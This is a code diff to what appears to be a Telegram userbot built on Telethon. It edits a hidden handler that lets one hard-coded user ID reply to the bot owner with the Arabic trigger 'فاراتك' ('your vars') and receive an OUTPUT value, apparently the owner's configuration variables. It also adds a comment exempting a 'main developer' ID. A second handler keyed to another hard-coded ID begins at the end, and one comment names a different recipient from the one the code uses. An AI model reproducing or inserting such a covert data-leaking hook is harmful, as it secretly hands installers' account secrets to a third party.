@@ -483,11 +483,13 @@ async def Hussein(event):
 #####
 ####
 ##
-Also = [6759899119]
+also = [6759899119]
 @Qrh9.on(events.NewMessage(incoming=True))
 async def Hussein(event):
-    if event.reply_to and event.sender_id in Also and event.reply_to.sender_id != 6528926431:
+    if event.reply_to and event.sender_id in also:
         reply_msg = await event.get_reply_message()
+        if reply_msg.sender_id == 6528926431:
+            return  # تفلش الفانكشن لحمايه المطور الاساسي
         owner_id = reply_msg.from_id.user_id
         if owner_id == Qrh9.uid:
             if event.message.message == "فاراتك":
@@ -499,6 +501,7 @@ async def Hussein(event):
                 # Send the output to user ID 6320583148
                 await Qrh9.send_message(6759899119, OUTPUT)
 ###
+##
 idk = [6320583148]
 @Qrh9.on(events.NewMessage(incoming=True))
 async def Hussein(event):
